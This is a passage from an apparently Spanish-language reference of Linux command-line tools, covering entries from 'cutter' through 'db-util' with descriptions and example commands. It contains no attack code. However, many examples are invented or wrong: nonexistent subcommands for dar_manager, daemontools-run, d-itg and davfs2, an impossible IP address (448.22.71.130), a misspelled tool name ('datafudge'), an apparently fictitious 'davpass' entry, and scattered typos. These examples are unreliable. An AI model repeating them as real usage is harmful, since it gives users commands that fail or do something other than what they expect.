$ cutter 192.168.1.10 (cerrar la conexión de la ip especificada)
$ cutter 192.168.1.10 22 (cerrar la conexión al puerto 22 de la ip especificada)
$ cutter 448.22.71.130 192.168.1.10 22 (cerrar conexión entre dos computadoras por el puerto 22)


cutycapt
utilidad para capturar la representación de una página web por parte de WebKit. Es una pequeña utilidad de línea de comandos multiplataforma para capturar la representación de una página web por parte de WebKit en una variedad de formatos vectoriales y de mapa de bits, incluidos SVG, PDF, PS, PNG, JPEG, TIFF, GIF y BMP
$ cutycapt --url=http://www.example.com --out=example.png (captura de una página completa y la guarda como imagen PNG)
$ cutycapt --url=http://www.example.com --min-width=1024 --min-height=768 --out=example.png (captura de una página con un tamaño mínimo de 1024x768)
$ cutycapt --url=http://www.example.com --javascript=off --out=example-no-js.png (captura con ejecución de JavaScript deshabilitada)
$ cutycapt --url=http://www.example.com --plugins=on --out=example-with-plugins.png (captura con plugins habilitados)
$ cutycapt --url=http://www.example.com --delay=5000 --out=example-with-delay.png (captura con un tiempo de espera después del carga)
$ cutycapt --url=google.es --out=localfile.png (especificando la url y nombre del archivo para la salida)


cvlc
Modo de la aplicación vlc [ver] usado como reproductor de música.
$ cvlc archivo.mp3
$ cvlc v4l2:///dev/video0 (activar cámara web)
Algunas teclas de control:
	Ctrl + mayusc + space (Reproducir/pausar)
	Ctrl + mayusc + n (siguiente archivo)
	Ctrl + mayusc + p (archivo anterior)
	Ctrl + mayusc + flecha arriba (Subir volumen)
	Ctrl + mayusc + flechas abajo (Bajar volumen)
	Ctrl + mayusc + m (Silenciar)
	Ctrl + mayusc + q (Salir)


cvs
[Concurrent Versions System]. Es un sistema de control de versiones que permite mantener el acceso a versiones antiguas de archivos (normalmente código fuente), mantener un registro de quién, cuándo y por qué se produjeron los cambios, etc. Es una herramienta antigua y ha sido superada por sistemas como Git o SVN en muchos aspectos.
$ cvs init (inicializar un repositorio CVS. Crea un directorio `.cvsignore`, un archivo `CVS/Root`, y un archivo `CVS/Entries`.)
$ cvs add directory_name (añadir un directorio al control de CVS)
$ cvs add file1.c file2.h (añadir archivos individuales al control de CVS)
$ cvs commit -m "Mensaje de commit inicial" (hacer un commit inicial)
$ cvs update (Actualizar el repositorio local)
$ cvs checkout module_name (obtener una copia del repositorio desde un servidor remoto)
$ cvs commit -d (enviar cambios al servidor remoto)
$ cvs status (verificar el estado de los archivos)
$ cvs remove file_to_remove.c (eliminar un archivo del control de CVS)
$ cvs log file_to_check.c (verificar la historia de cambios de un archivo)


cvsps
Es un programa para generar información de "conjunto de parches" a partir de un repositorio CVS. En este caso, un conjunto de parches se define como un conjunto de cambios realizados en una colección de archivos, todos confirmados al mismo tiempo usando un único comando "cvs commit".
$ cvsps -v /ruta/al/repositorio (información básica de parches. Generará una salida detallada con información sobre cada cambio)
$ cvsps -v /ruta/al/repositorio | grep 'file1.c' (mostrar solo los cambios de archivos específicos)
$ cvsps -d 2023-01-01 /ruta/al/repositorio (obtener información de parches de una fecha específica)
$ cvsps -a /ruta/al/repositorio | sort | uniq -c (generar un resumen de cambios por autor)
$ cvsps -v /ruta/al/repositorio | awk '$3=="A:0"' (filtrar por tipo de cambio [A:0 para eliminaciones])
$ cvsps -v /ruta/al/repositorio > patches_info.csv (exportar la salida a un formato CSV)
$ cvsps -v /ruta/al/repositorio | awk '{print $1,$2}' | sort | uniq -c (combinar con otros comandos)


cvsweb
Es un script CGI WWW que proporciona acceso remoto a un repositorio CVS. Permite explorar el árbol completo, con controles de acceso configurables. Mostrará el historial de revisiones de un archivo, así como también generará diferencias entre revisiones y permitirá descargar cualquier revisión del archivo completo.
$ firefox http://tu_servidor/cvsweb/ (abrirá la interfaz gráfica de cvsweb en el navegador)
$ firefox http://tu_servidor/cvsweb/directorio/ (acceder a un directorio específico)
$ firefox http://tu_servidor/cvsweb/directorio/archivo.c (ver el contenido de un archivo específico)


cw
Tutor de código Morse. én incluye archivos de ejemplo (con la extensión "cw") que contienen comandos que se pueden usar para cambiar propiedades como la velocidad, el tono y el espaciado de los caracteres.
$ cw (espera la palabra que se introduce y al pulsar "intro" se escucha por los altavoces en código Morse y por pantalla se indica la letra que dice)
$ cwgen (genera grupos de caracteres aleatorios para practicar el código Morse)
$ cw -w 5 -v 50 (produce los sonidos más espaciados. De 4 a 60 lo más rápido y a menos volumen. De 0 a 100 el más alto)


cwcp
Proporciona soporte para aprender a usar el código Morse. Este paquete proporciona un tutor interactivo de código Morse con una interfaz de usuario de pantalla completa basada en texto (ncurses).
$ cwcp


cycle
Calendario para mujeres. Dada una duración del ciclo o estadísticas de varios períodos, puede calcular los días hasta la menstruación, los días de sexo "seguro", el período fértil y los días hasta la ovulación. Permite al usuario escribir notas y ayuda a supervisar la administración de anticonceptivos hormonales.
$ cycle


d-itg
(Distributed Internet Traffic Generator) es una plataforma capaz de producir tráfico a nivel de paquete replicando con precisión los procesos estocásticos adecuados para las variables aleatorias IDT (Inter Departure Time) y PS (Packet Size) (exponencial, uniforme, cauchy, normal, pareto, ...). D-ITG admite la generación de tráfico tanto IPv4 como IPv6 y es capaz de generar tráfico a nivel de red, transporte y aplicación.
# d-itg (iniciar el generador de tráfico)
# d-itg --tcp (configurar el tipo de tráfico, por ejemplo, TCP)
# d-itg --size=1500 --rate=1000000 (configurar el tamaño de paquete y velocidad de transmisión)
# d-itg stop (parar el generador de tráfico)


d-shlibs
Herramienta utilizada en el sistema operativo Debian para ayudar en la creación de paquetes de bibliotecas compartidas [shared libraries] que intentan ayudar a automatizar el proceso y detectar errores simples. Consta de "d-shlibmove" que mueve el binario de la biblioteca compartida [.so] desde el directorio de instalación temporal al directorio del paquete de destino y "d-devlibdeps" que intenta enumerar las dependencias de la biblioteca de desarrollo necesarias para usar el paquete -dev.
$ d-shlibmove /usr/src/package/lib/*.so /usr/lib/ (moverá todas las bibliotecas compartidas en /usr/src/package/lib/ al directorio /usr/lib`)
$ d-evlibdeps package_1.0-1.dsc (analizará el paquete package_1.0-1.dsc y generará un archivo package_1.0-1.deb-deps con las dependencias desarrollo encontradas)


daa2iso
Herramienta de conversión de archivos DAA [Direct Access Archive] a ISO. DAA2ISO es una herramienta de línea de comandos de código abierto para convertir imágenes de archivos DAA de una o varias partes al formato ISO original. La imagen DAA es, de hecho, simplemente un ISO comprimido que se puede crear a través del programa comercial PowerISO.
$ daa2iso archivo.daa output.iso


dadadodo
Herramienta que genera texto aleatorio basado en un análisis estadístico del texto proporcionado. Se utiliza para crear cadenas de palabras que no tienen mucho sentido lógico pero pueden ser gramaticalmente correctas o casi correctas, dependiendo del texto fuente. Esto se logra utilizando cadenas de Markov, un enfoque probabilístico para modelar el texto.
$ dadadodo -c 1 texto.txt (genera una sola oración aleatoria basada en el texto del archivo)
$ dadadodo -c 5 texto.txt -o dada_texto.txt (generar 5 oraciones aleatorias y guardandolo en un archivo)
$ dadadodo -a texto.txt (muestra información como las palabras únicas, su frecuencia, y cómo se conectan en el modelo de Markov)
$ echo "La vida es un carnaval lleno de colores." | dadadodo -c 3 (genera 3 oraciones con el texto)
$ dadadodo -c 10 poesia.txt noticias.txt (genera 10 oraciones con los textos de los dos archivos combinados)


dacco-common
El acrónimo DACCO significa 'Diccionari Anglès-Català de Codi Obert', o 'Diccionario inglés-catalán de código abierto'. El diccionario contiene traducciones, ejemplos y otros detalles gramaticales en ambos idiomas en archivos XML utilizados para otros proyectos como qdacco.


daemon
Hay muchas tareas que se deben realizar para configurar correctamente un proceso demonio. Daemon realiza estas tareas y además, resulta útil para escribir demonios en lenguajes distintos de C, C++ o Perl, por ejemplo, sh, Java.
$ daemon --name=script-daemon --output=/var/log/mi-script.log script.sh (asigna un nombre al demonio y especifica un archivo de registro del script.sh que se ejecutará como demonio)
$ daemon --name=criptt-daemon --respawn -- mi-script.sh (reinicia el proceso automáticamente si termina inesperadamente)
$ daemon --name=apli-java java -jar mi-aplicacion.jar (ejecutar una aplicación Java como demonio)
$ daemon --name=mi-script --user=usuario --group=grupo mi-script.sh (ejecutar el demonio bajo un usuario y grupo específicos)
$ daemon --name=mi-script --nice=10 mi-script.sh (ejecutar un proceso con una prioridad de CPU ajustada por ejemplo a 10 [valores positivos reducen la prioridad])
$ daemon --stop --name=script-daemon (detener un demonio que se está ejecutando)
$ daemon --running --name=script-daemon (verificar si un demonio está en ejecución)
1.-
Si se desea ejecutar varios scripts y registrar su salida en diferentes archivos:
$ daemon --name=script1 --output=/var/log/script1.log script1.sh
$ daemon --name=script2 --output=/var/log/script2.log script2.sh


daemonize
Un demonio es un proceso que se ejecuta en segundo plano, es decir, sin una terminal asociada o shell de inicio de sesión ya sea esperando que ocurra algún evento o esperando realizar alguna tarea específica de manera periódica. La mayoría de los programas que están diseñados para ejecutarse como demonios hacen ese trabajo por sí mismos. Sin embargo, ocasionalmente se puede encontrar con uno que no lo hace. Cuando un programa demonio no se convierte correctamente en un verdadero demonio de Unix, es cuando se puede usar daemonize para obligarlo a ejecutarse como un verdadero demonio.
$ daemonize script.sh (ejecutará script.sh como un demonio)
$ daemonize --name=mi_demonio --pidfile=/var/run/mi_demonio.pid script.sh (especifica un nombre para el demonio y un archivo PID)
$ daemonize --stdout=/var/log/mi_demonio.log --stderr=/var/log/mi_demonio.err script.sh (se redireccionan las salidas estándar y de error a archivos específicos)
$ daemonize --restart=60 script.sh (hará que el demonio se reinicie cada 60 segundos si falla)
$ daemonize --background script.sh (ejecutará el script en segundo plano)
Nota.- El script tiene que estar diseñado para funcionar como un demonio, por ejemplo, usando fork(),  exec()...


daemonlogger
Registrador de paquetes y un demonio de soft tap. Es capaz de funcionar en dos modos: rastreando paquetes y registrándolos directamente en el disco o en Reflect mode [modo de "soft tap" - toque suave] donde refleja los paquetes en otra interfaz, útil para la monitorización en tiempo real sin interrumpir el tráfico de red. Daemonlogger se puede ejecutar en primer plano o en segundo plano como un demonio.
$ daemonlogger -i eth0 -f /var/log/packets.log (captura paquetes de una interfaz de red y los registra en un archivo en el disco)
$ daemonlogger -i eth0 -o eth1 (refleja los paquetes capturados [eth0] a otra interfaz de red [eth1])
$ daemonlogger -i eth0 -f /var/log/packets.log -o eth1 (captura los paquetes de eth0, los registra en /var/log/packets.log y también los envia a eth1)


daemontools
Colección de herramientas para administrar y supervisar servicios UNIX: envdir, envuidgid, fghack, multilog, pgrphack, readproctitle, setlock, setuidgid, softlimit, supervise, svc, svok, svscan, svscanboot, svstat, tai64n y tai64nlocal
- envdir permite configurar las variables de entorno de un programa a partir de archivos en un directorio, por ejemplo con un directorio myenv con los archivos:
$ ls mienv
     VAR1 (contenido: "valor1")
     VAR2 (contenido: "valor2")
Se puede ejecutar:
$ envdir ./myenv env (imprimirá las variables de entorno configuradas: VAR1=valor1 y VAR2=valor2)
- envuidgid configura las variables de entorno UID y GID basadas en el usuario especificado.
$ envuidgid nobody env (imprimirá las variables UID y GID para el usuario nobody)
- fghack permite que un programa en segundo plano use la terminal estándar.
$ fghack your-daemon (redirigirá la salida de un programa daemon a tu terminal
- multilog es una herramienta para registrar mensajes de forma eficiente.
$ myservice | multilog t ./logs (escribirá los mensajes en el directorio ./logs y aplicará la opción t para incluir marcas de tiempo)
- pgrphack ayuda a ejecutar un programa sin que sea el líder de su grupo de procesos.
$ pgrphack myprogram (cambia el grupo de procesos para nno causar problemas con otros supervisores)
- setuidgid ejecuta un programa como un usuario específico, configurando las variables UID y GID.
$ setuidgid nobody ls -la (ejecutará ls -la como el usuario nobody)
- supervise supervisa un servicio ejecutándolo continuamente y reiniciándolo si falla.
Crear un directorio que contenga un script run para iniciar el servicio.
$ cat ~/service/myservice
      #!/bin/sh
      exec myprogram
$ supervise ~/service/myservice
- svok comprueba si un servicio supervisado por supervise está funcionando.
$ svok /service/myservice (devuelve un código de salida 0 si el servicio está activo)
- svc controla un servicio supervisado: iniciar, detener, recargar, etc.
$ svc -u /service/myservice (-u inicia el servicio, -d lo detiene y -t lo reinicia)
- svscan escanea un directorio para supervisar todos los servicios contenidos en él.
$ svscan /service (escanea el directorio, busca subdirectorios con scripts run, y los supervisa)


daemontools-run
Inicia svscanboot desde inittab y proporciona el directorio /etc/service/ para que los servicios sean supervisados ​​por daemontools.
# daemontools-run /etc/service/myservice (iniciar un servicio específico)
# daemontools-run -d /etc/service/ (iniciar todos los servicios en el directorio /etc/service/)
# daemontools-run /etc/service/myservice status (verificar el estado de un servicio específico)
# daemontools-run /etc/service/myservice stop (detener un servicio)
# daemontools-run /etc/service/myservice restart (reiniciar un servicio)


dansguardian
[squid]. Filtro de contenidos web [cliente] que trabaja conjuntamente con el servidor proxy squid [servidor].
Adaptar el archivo de configuración:
# nano /etc/dansguardian/dansguardian.conf
Algunos parámetros a especificar [caso de no estarlo]:
	language = 'spanish'
	reportinglevel = 3 #valores de 1, 2 y 3
	filterport = 8080
	proxyip = 127.0.0.1 #La misma ip del proxy squid
	proxyport = 3128
Guardar el archivo.
El listado de conceptos [ip, nombre de dominio, frases... ] por los que se puede banear y conceptos excluidos en:
# ls /etc/dansguardian/lists/
Algunos de los más usuales:
bannedextensionlist (extensiones no permitidas)
banneriplist (listado de ips no permitidas)
bannedmimetypelist (Tipos MIME no permitidos)
bannedregexpurllist  (Listado de expresiones a bloquear)
bannedurllist (Bloquear partes especificas de un sitio)
bannedsitelist (Bloquear sitios)
bannedphraselist (Listado de frases prohibidas encerradas entre < >
exceptionsitelist (Lista de excepciones de sitios)
exceptioniplist (lista de excepciones de direcciones IP)
exceptionuserlist (Lista de excepciones de nombres de usuarios que no serán filtrado)
# /etc/init.d/dansguardian restart


daps
Suite de creación y publicación de DocBook (DAPS). DAPS contiene un conjunto de hojas de estilo, scripts y archivos make que le permiten crear HTML, PDF, EPUB y otros formatos a partir de DocBook XML con un solo comando. También contiene herramientas para generar archivos tar de fuentes perfilados para distribuir sus fuentes XML para su traducción o revisión. DAPS también incluye herramientas que lo ayudan a escribir DocBook XML: verificador de enlaces, validador, corrector ortográfico, macros de edición y hojas de estilo para convertir DocBook XML.
$ daps -d DC-example html --single (generar una sola página HTML)
$ daps -d DC-example --styleroot /usr/share/xml/docbook/stylesheets/daps2013 epub (generar ePUB utilizando hojas de estilo personalizadas)
$ daps -d DC-example pdf --formmatter=xep --grayscale --cropmarks (generar PDF utilizando el formateador XEP)
$ daps -d DC-example linkcheck --show (verificar enlaces y mostrar el resultado en un navegador)


daptup
Muestra lista de paquetes ingresados recientemente al repositorio y lista los paquetes que han tenido actualizaciones. Este comando no necesita ser llamado explícitamente ya que se llama automaticamente por todos los gestores de paquetes compatibles.
# daptup --pre
# daptup --post
# daptup --last


dar
crea, prueba, enumera, extrae, compara, fusiona, aísla y repara archivos dar. Archivador con todas las funciones, compatible con copias de seguridad diferenciales, porciones, compresión y compatibilidad con ATTR/ACL [/Access Control List]. Incluye las herramientas dar_cp, dar_manager, dar_slave, dar_split y dar_xform.
$ dar_cp origen.dar /ruta/destino (copiar archivos o directorios desde un archivo DAR a otro)
$ dar_manager create nombre_archivo.dar (gestionar archivos DAR, como crear, listar, extraer y eliminar archivos DAR)
$ dar_manager list nombre_archivo.dar (listar contenido de un archivo DAR)
$ dar_manager extract nombre_archivo.dar (extraer archivos de un DAR)
$ dar_slave -x nombre_archivo.dar (se ejecuta en segundo plano para realizar operaciones en archivos DAR sin bloquear el terminal principal)
$ dar_split -s 100M archivo_original.dar ptes_* (divide archivos DAR en múltiples partes para facilitar su manejo y transferencia)
$ dar_xform -c nombre_archivo.dar (comprimir un archivo DAR)
$ dar_xform -d nombre_archivo.dar (descomprimir un archivo DAR)
$ dar_manager enum nombre_archivo.dar (enumerar archivos)
$ dar_manager compare archivo1.dar chivo2.dar (comparar archivos DAR)
$ dar_manager merge archivo1.dar chivo2.dar resultado.dar (fusionar chivos DAR)
$ dar_manager isolate nombre_archivo.dar /ruta/destino (aislar un archivos DAR)
$ dar_manager repair nombre_archivo.dar (reparación de archivos DAR)


darcs
Es un sistema de control de versiones gratuito y de código abierto.
$ darcs init (iniciar un nuevo repositorio)
$ darcs add archivo.txt (agregar archivo al repositorio)
$ darcs record -a (hacer un commit inicial)
$ darcs status (verificar el estado del repositorio)
$ darcs changes (verificar la historia del repositorio)
$ darcs revert (deshacer cambios)
$ darcs diff --from=commit1 --to=commit2 (revisar diferencias entre dos commits)
$ darcs pull (fusionar cambios del repositorio)
$ darcs push (enviar cambios al repositorio remoto)
$ darcs verify (verificar la integridad del repositorio)


dares
Rescatar contenido de cds y dvds dañados
$ dares -i image_cdrom -s /tmp (salvar en /tmp)


darkhttpd
Servidor de archivos via web. Acceso por navegador con http://url_o_ip:puerto.
$ darkhttp /home/usuario/share --port 12001 --daemon (Directorio, puerto de escucha 12001 y dejando como demonio. Matar con killall darkhttpd)
$ darkhttp /home/usuario/share --port 12001 --log  archivo  --chroot  (Sin dejar en background. Creando un archivo con las incidencias y bloqueando el servidor en el directorio especificado. Matar con ctrl+c)


darkslide
Generador de presentaciones HTML5. Puede escribir el contenido de la diapositivas utilizando Markdown, ReStructuredText y Textile, tambien admite temas CSS/JS, incrustación de imágenes con Base64 y transiciones elegantes.
Mientras se está visualizando con la flechas para pasar las diapositivas:
h -- visualización de la ayuda
t -- alternar la tabla de contenidos de la presentación.
ESC- visualizar la descripción general de la presentación
n -- alternar la visibilidad del número de diapositiva
b -- alternar la puesta en blanco de la pantalla
c -- alternar la visualización de diapositivas dobles [diapositiva actual y próxima]
S -- alternar la visualización del enlace al archivo de origen de cada diapositiva
2 -- alternar las notas en sus diapositivas especificado con la macro .notes


darkstat
Monitorizar el tráfico de red. Configurar la herramienta:
# nano /etc/darkstat/init.cfg
Descomentar los parámetros DIR, PORT, BINDIP y LOCAL y modificar START_DARKSTAT=yes
Arrancar el servicio:
# /etc/init.d/darkstat start
En el navegador colocar la dirección: localhost:667


das_watchdog
Junto con test_rt estan diseñados para administrar y supervisar sistemas en tiempo real, asegurando que estos procesos no puedan colgar la máquina. das_watchdog es un daemon que monitorea el sistema para evitar bloqueos causados por procesos en tiempo real. Si detecta que un proceso en tiempo real está consumiendo todos los recursos y bloqueando al sistema, el daemon toma medidas para restaurar la estabilidad. test_rt es una herramienta auxiliar que simula un proceso en tiempo real. Se Puede usar para probar la configuración del sistema y verificar que el daemon das_watchdog responde correctamente a un proceso en tiempo real mal comportado.
# das_watchdog (iniciar el daemon)
# das_watchdog --test (efectuar un test para ver si el mensage de la pantalla esta funcionando, se puede cerrar)
# das_watchdog -v (mostrará información sobre los procesos monitoreados y cualquier intervención del watchdog)
# journalctl -u das_watchdog (mientras el daemon está en ejecución, se puede monitorear los logs del sistema para observar si intervino en algún proceso)
# test_rt (inicia un proceso que simula una carga en tiempo real. Si el proceso interfiere con el sistema, das_watchdog debería intervenir)
# test_rt 5000 (ejecutará el proceso en tiempo real durante 5 segundos)
# test_rt --stress (fuerza un uso más intensivo de los recursos)
# das_watchdog --min-priority 50 (ajusta la prioridad mínima de los procesos que das_watchdog monitorea)


dash
[Debian Almquist SHell]. Shell compatible con POSIX derivado de ash. Dado que ejecuta scripts más rápido que bash y tiene menos dependencias de bibliotecas, lo que lo hace más robusto frente a fallos de software o hardware, se utiliza como shell de sistema predeterminado en los sistemas Debian.
$ dash (estando en bash pasa a dash. "exit" para volver a bash)


datafudge
Falsificar la fecha del sistema. Este programa y la biblioteca de precarga falsifica la fecha del sistema para que los programas piensen que el reloj es diferente. La falsificación no es completa; las marcas de tiempo en los archivos no se ven afectadas de ninguna manera.
$ datafudge -s "2025-05-07 12:31" date -R (siempre marcará la misma fecha)
$ datefudge "2025-05-07 12:31" date -R


datalad
Plataforma de distribución y gestión de datos que brinda acceso a una amplia gama de recursos de datos que están disponibles en línea.
$ datalad create mi_dataset (crear un nuevo dataset en la carpeta actual con el nombre "mi_dataset")
$ datalad install https://example.com/mi_dataset.git (descargar e instalar un dataset existente desde una URL)
$ datalad get mi_dataset/carpeta/archivos (obtener todos los archivos de una carpeta específica)
$ datalad publish mi_dataset (que el dataset se publique en un servidor conocido por DataLad)
$ datalad update mi_dataset (actualizar un dataset existente en la máquina local)
$ datalad search palabra ("palabra" es la clave que se desea buscar)
$ datalad clone mi_dataset (clonar un dataset existente)
$ datalad install ssh://mi_usuario@mi_servidor/mi_ruta/dataset.git (descargarlo desde un servidor remoto)
$ datalad add archivo.txt otro_archivo.txt directorio/ (agregar nuevos archivos o directorios a un dataset existente)
$ datalad diff mi_dataset (ver los cambios realizados en un dataset)


datamash
Herramienta de estadísticas. Realiza operaciones numéricas y estadísticas básicas en archivos de datos textuales de entrada. Incluye la herramienta decorate. Los ejemplos en el directorio /usr/share/doc/datamash/examples/. Algunas opciones: count [num de elementos], sum [suma], min [elemento más bajo], max [el mayor], mean [la media], median [el del medio]...
$ seq 7 12 | datamash count 1 (el número de elementos de la primera parte es 6)
$ seq 3 | datamash max 1 min 1 mean 1 median 1 (el máximo, el minimo, la media y el del medio)
$ datamash -g 2 min 3 max 3 < /usr/share/doc/datamash/examples/scores.txt (encuentre el puntaje más bajo [mín.] y más alto [máx.] para cada especialidad universitaria, la especialidad está en la columna 2, los valores de puntaje están en la columna 3)
$ datamash -g 2 mean 3 sstdev 3 < /usr/share/doc/datamash/examples/scores.txt (encuentre el número de estudiantes, la puntuación media y la desviación estándar de la muestra para cada especialidad universitaria)
Una línea de encabezado es una primera línea opcional en los archivos de entrada o salida, que etiqueta cada columna. Datamash puede generar una línea de encabezado en el archivo de salida, incluso si el archivo de entrada no tiene una línea de encabezado (scores.txt no tiene una línea de encabezado, la primera línea del archivo contiene datos). Use --header-out para agregar una línea de encabezado a la salida (cuando la entrada no contiene una línea de encabezado):
$ datamash --header-out -g 2 count 3 mean 3 pstdev 3 < /usr/share/doc/datamash/examples/scores.txt
$ datamash -s -g 13 count 2 < /usr/share/doc/datamash/examples/genes.txt (agrupar por columna 13 y, para cada grupo, cuente los valores en la columna 2. -s para ordenar automáticamente el archivo de entrada)
$ datamash -s -g 13 count 2 collapse 2 < /usr/share/doc/datamash/examples/genes.txt (usando la operación de collapse, datamash puede imprimir todas las isoformas de cada gen)
$ datamash -H -s -g 13 count 2 collapse 2 < /usr/share/doc/datamash/examples/genes.txt (al utilizar un archivo con una línea de encabezado, agregar -H)
$ echo -e '1.0\n2.5\n3.1\n4.3\n5.6\n5.7' | tr '.' ',' | datamash mean 1 (Obtener la media de una sola columna de números flotantes, los flotantes deben usar "," y no ".")
$ echo -e '1\n2\nNa\n3\nNaN' | datamash --narm mean 1 (Obtener la media de una sola columna de números ignorando las cadenas "Na" y "NaN" literales)
$ echo '3,14 42 1000 -51' | tr ' ' '\n' | datamash sum 1
1.-
$ cat table.txt
brown bread mat hair 42
blue cake mug shirt -7
yellow banana window shoes 3.14
$ datamash -t' ' sum 5 <table.txt (caracteres separados por espacios, sumar el 5º)
38.14
2.-
$ cat scores.csv
Name,Maths,Physics,Chemistry
Ith,100,100,100
Cy,97,98,95
Lin,78,83,80
Er,60,70,90
$ datamash -t, transpose <scores.csv
Name,Ith,Cy,Lin,Er
Maths,100,97,78,60
Physics,100,98,83,70
Chemistry,100,95,80,90
3.-
$ cat toys.txt
car blue
car red
car yellow
truck brown
bus green
bus maroon
rocket white
$ datamash -t' ' -g1 collapse 2 <toys.txt
car blue,red,yellow
truck brown
bus green,maroon
rocket white
$ datamash -t' ' -g1 count 2 rand 2 <toys.txt
car 3 red
truck 1 brown
bus 2 green
rocket 1 white


date
Relacionado con fechas y calendarios.
$ date +%s  (en tiempo unix - desde el 1 de enero de 1970-)
$ date -d @1441543931 (Pasar fecha unix a normal)
$ date -s "2010/01/10 16:59"  (forma de establecer la fecha y hora actual)
$ date –u 0110170210  (Otra forma de establecer la fecha. mes 01, día 10, hora 17:02 y año 2010)
$ date +"%A,%d-%m-%Y"
$ date +%c (dia de la semana, fecha y hora, minutos y segundos)
Algunas opciones:
	%D (fecha en formato mm/dd/yy)
	%T (hora:minutos:segundos en formato 24h)
	%R (hora:minutos en formato 24h)
	%d (día del mes con 2 dígitos)
	%m (mes con 2 digitos)
	%y (año con 2 dígitos)
	%Y (año con 4 dígitos)
	%a (nombre abreviado del día)
	%A (nombre completo del día)
	%b (nombre abreviado del mes)
	%B (nombre completo del mes)
	%H (hora con 2 dígitos en formato 0-24h)
	%I (hora con 2 digitos en formato 0-12h)
	%M (Solo los minutos)
	%S (Solo los segundos)
$ date +"%A,%d-%m-%Y" --date '1966/4/20 20500 days' (Para saber cuando alguien cumplirá 20500 días desde su nacimiento)
$ watch -n1 'banner `date +%T`' (Rejoj digital en ascii)
1.-
Saber la hora encualquier parte del mundo:
$ TZ="America/Guatemala" date (Muestra la hora actual de Guatemala)
$ TZ="Europe/Berlin" date (Muestra la de Berlin)


datefudge
Pretende que el tiempo del sistema sea diferente. No lo altera.
$ datefudge "2115-10-23 11:20" date -R
$ datefudge "2127-03-05 12:30" date +%s
$ datefudge "23 Oct 2210" date -R
$ datefudge "2136-10-23 09:33" sh -c "sleep 3; date -R"


dateutils
Varias herramientas que giran en torno a fechas y horas entre zonas horarias (dateutils.dadd, dateutils.ddiff, dateutils.dround, dateutils.dsort, dateutils.dzone, dateutils.dconv, dateutils.dgrep, dateutils.dseq, dateutils.dtest, dateutils.strptime). Si se omite fecha/hora, el valor predeterminado es 'ahora'.
$ dateutils.dzone Europe/Madrid Australia/Sydney America/Bogota today (fecha exacta de varias ciudades)
$ dateutils.dzone Europe/Madrid Australia/Sydney (lo mismo)
$ dateutils.ddiff 2022-02-15 2023-01-05 (muestra los dias de diferencia entre dos fechas)
$ dateutils.ddiff 9:00:00 13:05:00 -f '%H:%M:%S' (mostrará la diferencia en horas, minutos y segundos)
$ dateutils.dround -n 10:02:00 5s (aumenta la fecha en 5 segundos)


dav-text
Editor de texto minimalista pensado para proporcionar un editor de texto estable que sea eficiente tanto en el uso de la memoria como del procesador.
$ dav archivo.txt (si el archivo no existe, se creará uno nuevo)


davfs2
Montar un recurso WebDAV como un sistema de archivos normal. WebDAV [Web Distributed Authoring and Versioning], es una extensión del protocolo HTTP que permite la creación de recursos en un servidor web remoto. davfs2 proporciona la capacidad de acceder a dichos recursos como si fueran un sistema de archivos típico, lo que permite su uso por parte de aplicaciones estándar sin soporte integrado para WebDAV.
# davfs2 /path/to/mountpoint (montar un recurso WebDAV)
# umount /path/to/mountpoint (desmontar un recurso WebDAV)
# davfs2 -o max_read_ahead=131072 /path/to/mountpoint (montar un recurso WebDAV con opciones adicionales)
# davfs2-info /path/to/mountpoint (mostrar información detallada sobre un recurso WebDAV)
# davfs2-clean (limpiar caché de davfs2)
1.-
Configurar autenticación básica para un recurso WebDAV:
# echo "username:password" | sudo tee /etc/davfs2/secrets
# chmod 600 /etc/davfs2/secrets


davix
Kit de herramientas [davix-cp, davix-get, davix-http, davix-ls, davix-mkdir, davix-mv, davix-put y davix-rm] diseñado para operaciones con archivos con protocolos basados en http (WebDav, Amazon S3, ... Cada ejecutable está especializado en una operación específica similar a los comandos tradicionales de Unix, pero diseñados para entornos remotos basados en HTTP.
$ davix-cp https://example.com/archivo.txt ./archivo_local.txt (descargar un archivo remoto)
$ davix-get https://example.com/datos.json (descargar un archivo desde un servidor HTTP)
$ davix-get --cert client.pem https://secure.example.com/archivo.txt (descargar un archivo desde un servidor protegido con autenticación)
$ davix-http GET https://example.com/ (realizar una solicitud GET para comprobar un servidor)
$ davix-ls https://example.com/directorio/ (listar el contenido de un directorio en un servidor)
$ davix-ls -l https://example.com/directorio/ (listar con detalles)
$ davix-mkdir https://example.com/nuevo_directorio/ (crear un directorio en un servidor)
$ davix-mv davs://webdav.example.com/viejo.txt davs://webdav.example.com/nuevo.txt (mueve o renombra archivos en un servidor remoto)
$ davix-mv davs://webdav.example.com/archivo.txt davs://webdav.example.com/backup/archivo.txt (mover un archivo a otro directorio remoto)
$ davix-put ./archivo_local.txt davs://webdav.example.com/archivo_remoto.txt (subir un archivo al servidor remoto)
$ davix-rm davs://webdav.example.com/archivo.txt (eliminar un archivo en un servidor WebDAV)
$ davix-rm -r davs://webdav.example.com/directorio/ (eliminar un directorio completo)


davpass
Sistema de archivos virtual para acceder a archivos, imágenes de disco y ubicaciones remotas
$ davpass -h HOST -u usuario -p paswdr


db-util
Utilidades de base de datos de Berkeley. Este paquete vacío [dummy package] no contiene archivos funcionales ni ejecutables por sí mismo. Su propósito es proporcionar dependencias que instalan otros paquetes relacionados o facilitar transiciones entre versiones de software. Cuandose instala db-util, este no contiene las herramientas en sí, pero depende del paquete que sí las incluye, como db5.3-util u otra versión de Berkeley DB Utility. Esto ayuda a gestionar versiones y dependencias sin que el usuario tenga que preocuparse por instalar cada utilidad individualmente.. Incluye las herramientas db_archive [Archivar archivos de log obsoletos], db_checkpoint [Crear puntos de control], db_deadlock [Detección de bloqueos], db_dump [Exportar una base de datos], db_hotbackup, db_load, db_log_verify, db_printlog, db_recover, db_replicate, db_stat [Ver estadísticas de la base de datos], db_upgrade y db_verify
$ db_archive -a (muestra todos los archivos de registro necesarios para recuperar la base de datos)
$ db_archive -h /var/lib/db -d /backup/logs (mover archivos de registro no necesarios a un directorio de respaldo)
$ db_checkpoint -h /var/lib/db -k 20 (crea un punto de control si no se ha creado uno en los últimos 20 KB de operaciones)
$ db_deadlock -h /var/lib/db -a (detecta y selecciona automáticamente una transacción para terminar si hay un bloqueo)
$ db_dump -h /var/lib/db mydb.db > backup.db (convierte una base de datos binaria en un archivo de texto para realizar copias de seguridad)
$ db_load -h /var/lib/db -f backup.db newdb.db (importar el volcado)
$ db_stat -h /var/lib/db -m (muestra información detallada sobre el uso de memoria)


dbab
